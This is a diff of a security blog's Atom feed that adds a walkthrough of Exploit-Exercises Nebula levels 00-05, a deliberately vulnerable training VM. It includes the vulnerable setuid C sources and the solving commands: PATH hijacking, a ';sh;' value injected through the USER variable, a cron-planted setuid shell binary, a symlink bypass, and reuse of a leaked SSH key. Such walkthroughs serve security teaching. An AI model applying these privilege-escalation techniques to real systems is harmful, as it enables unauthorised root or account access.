@@ -4,7 +4,7 @@
   <title><![CDATA[0x41414141]]></title>
   <link href="http://73696e65.github.io/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-06-13T23:16:31+02:00</updated>
+  <updated>2015-06-16T21:32:28+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,441 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit-Exercises: Nebula (00-05)]]></title>
+    <link href="http://73696e65.github.io/blog/2015/06/16/exploit-exercises-nebula-00-05/"/>
+    <updated>2015-06-16T19:04:18+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/06/16/exploit-exercises-nebula-00-05</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>
+
+<p>Because it was not possible to log in via ssh, we generated the host key:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level00</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> find / <span class="se">\(</span> -perm -4000 <span class="se">\)</span> 2&gt;/dev/null
+</span><span class='line'><span class="go">/bin/.../flag00</span>
+</span><span class='line'><span class="go">/bin/fusermount</span>
+</span><span class='line'><span class="go">/bin/mount</span>
+</span><span class='line'><span class="go">/bin/ping</span>
+</span><span class='line'><span class="go">/bin/ping6</span>
+</span><span class='line'><span class="go">/bin/su</span>
+</span><span class='line'><span class="go">[ .. SNIP .. ]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found a suspicious file on the first line, after executing, we obtained flag.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> id
+</span><span class='line'><span class="go">uid=1001(level00) gid=1001(level00) groups=1001(level00)</span>
+</span><span class='line'><span class="gp">level00@nebula:~$</span> /bin/.../flag00
+</span><span class='line'><span class="go">Congrats, now run getflag to get your flag!</span>
+</span><span class='line'><span class="gp">flag00@nebula:~$</span> id
+</span><span class='line'><span class="go">uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)</span>
+</span><span class='line'><span class="gp">flag00@nebula:~$</span> getflag
+</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level01</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Solution:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
+</span><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">echo</span> <span class="s1">&#39;sh&#39;</span> &gt; <span class="nb">echo</span>
+</span><span class='line'><span class="gp">level01@nebula:~$</span><span class="nb"> </span>chmod +x ./echo
+</span><span class='line'><span class="gp">level01@nebula:~$</span> id
+</span><span class='line'><span class="go">uid=1002(level01) gid=1002(level01) groups=1002(level01)</span>
+</span><span class='line'><span class="gp">level01@nebula:~$</span> /home/flag01/flag01
+</span><span class='line'><span class="gp">sh-4.2$</span> id
+</span><span class='line'><span class="go">uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)</span>
+</span><span class='line'><span class="gp">sh-4.2$</span> getflag
+</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level02</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Solution:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level02@nebula:~$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;;sh;&#39;</span>
+</span><span class='line'><span class="gp">level02@nebula:~$</span> /home/flag02/flag02
+</span><span class='line'><span class="go">about to call system(&quot;/bin/echo ;sh; is cool&quot;)</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">sh-4.2$</span> getflag
+</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level03</h2>
+
+<p>There is a crontab entry that is called every couple of minutes.</p>
+
+<p>Because the /tmp is mounted with nosuid option, we use home directory to store suid binary:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level03@nebula:~$</span> mount <span class="p">|</span> grep nosuid
+</span><span class='line'><span class="go">proc on /proc type proc (rw,noexec,nosuid,nodev)</span>
+</span><span class='line'><span class="go">sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)</span>
+</span><span class='line'><span class="go">devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)</span>
+</span><span class='line'><span class="go">tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)</span>
+</span><span class='line'><span class="go">tmpfs on /tmp type tmpfs (rw,nosuid,nodev)</span>
+</span><span class='line'><span class="go">none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)</span>
+</span><span class='line'><span class="go">none on /run/shm type tmpfs (rw,nosuid,nodev)</span>
+</span><span class='line'><span class="go">vmware-vmblock on /run/vmblock-fuse type fuse.vmware-vmblock (rw,nosuid,nodev,default_permissions,allow_other)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The file invoked by cron is here:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>cat writable.sh
+</span><span class='line'><span class="c">#!/bin/sh</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> i in /home/flag03/writable.d/* <span class="p">;</span> <span class="k">do</span>
+</span><span class='line'>  <span class="o">(</span><span class="nb">ulimit</span> -t 5<span class="p">;</span> bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
+</span><span class='line'>  rm -f <span class="s2">&quot;$i&quot;</span>
+</span><span class='line'><span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>Our code to obtain suid shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:~<span class="nv">$ </span><span class="nb">cd</span> /home/flag03/writable.d/
+</span><span class='line'>
+</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="s1">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="s1">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="s1">#include &lt;unistd.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">int main()</span>
+</span><span class='line'><span class="s1">{</span>
+</span><span class='line'><span class="s1">   setreuid(geteuid(),geteuid());</span>
+</span><span class='line'><span class="s1">   execve(&quot;/bin/sh&quot;, NULL, NULL);</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">   return 0;</span>
+</span><span class='line'><span class="s1">}</span>
+</span><span class='line'><span class="s1">&#39;</span> &gt; /tmp/run.c
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash</span>
+</span><span class='line'><span class="s1">gcc /tmp/run.c -o /home/flag03/x</span>
+</span><span class='line'><span class="s1">chmod +s /home/flag03/x</span>
+</span><span class='line'><span class="s1">&#39;</span> &gt; run.sh
+</span><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>chmod +x run.sh
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After a little waiting, the suid binary is created:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03/writable.d<span class="nv">$ </span>../x
+</span><span class='line'>bash-4.2<span class="nv">$ </span>getflag
+</span><span class='line'>You have successfully executed getflag on a target account
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level04</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s [file to read]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;token&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You may not access &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to read fd %d&quot;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We cannot read the token file, but symlink technique is sufficient:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:~$ cd /home/flag04/
+</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 
+</span><span class='line'>./flag04 [file to read]
+</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 token 
+</span><span class='line'>You may not access 'token'
+</span><span class='line'>level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/x
+</span><span class='line'>level04@nebula:/home/flag04$ ./flag04 /tmp/x 
+</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2
+</span><span class='line'>level04@nebula:/home/flag04$ su - flag04
+</span><span class='line'>Password: 
+</span><span class='line'>flag04@nebula:~$ getflag 
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level05</h2>
+
+<p>In /home/flag05 we can find the backup file with ssh private key.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level05@nebula:/home/flag05$</span> tar xvzf .backup/backup-19072011.tgz  -C /tmp/
+</span><span class='line'><span class="go">.ssh/</span>
+</span><span class='line'><span class="go">.ssh/id_rsa.pub</span>
+</span><span class='line'><span class="go">.ssh/id_rsa</span>
+</span><span class='line'><span class="go">.ssh/authorized_keys</span>
+</span><span class='line'>
+</span><span class='line'><span class="gp">level05@nebula:/home/flag05$</span> ssh -i /tmp/.ssh/id_rsa flag05@0
+</span><span class='line'><span class="gp">flag05@nebula:~$</span> getflag
+</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Hackademic: RTB2]]></title>
@@ -2901,7 +3336,7 @@ predictable for dirb.</p>
 
 <p>There is nothing interesting for us except the sysadmin account.</p>
 
-<p>Web page mentions <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#99;&#x75;&#115;&#x74;&#111;&#x6d;&#101;&#x72;&#115;&#x65;&#x72;&#x76;&#x69;&#x63;&#101;&#97;&#100;&#x6d;&#105;&#x6e;&#64;&#110;&#x6f;&#x73;&#101;&#x63;&#98;&#x61;&#110;&#107;&#x2e;&#99;&#x6f;&#x6d;">&#x63;&#x75;&#115;&#x74;&#x6f;&#x6d;&#x65;&#114;&#115;&#101;&#114;&#x76;&#105;&#99;&#101;&#97;&#x64;&#109;&#x69;&#110;&#64;&#x6e;&#x6f;&#115;&#x65;&#x63;&#x62;&#97;&#x6e;&#107;&#x2e;&#99;&#111;&#x6d;</a> email address. After a
+<p>Web page mentions <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x63;&#117;&#x73;&#116;&#111;&#x6d;&#x65;&#x72;&#115;&#x65;&#114;&#118;&#x69;&#x63;&#x65;&#97;&#x64;&#109;&#x69;&#110;&#x40;&#x6e;&#x6f;&#115;&#101;&#x63;&#98;&#x61;&#x6e;&#107;&#46;&#99;&#111;&#x6d;">&#x63;&#x75;&#115;&#116;&#111;&#109;&#101;&#114;&#x73;&#x65;&#x72;&#118;&#x69;&#99;&#101;&#97;&#100;&#x6d;&#x69;&#110;&#x40;&#x6e;&#x6f;&#x73;&#x65;&#x63;&#x62;&#x61;&#x6e;&#107;&#46;&#99;&#x6f;&#109;</a> email address. After a
 little trying, we found out the user account that exists:</p>
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
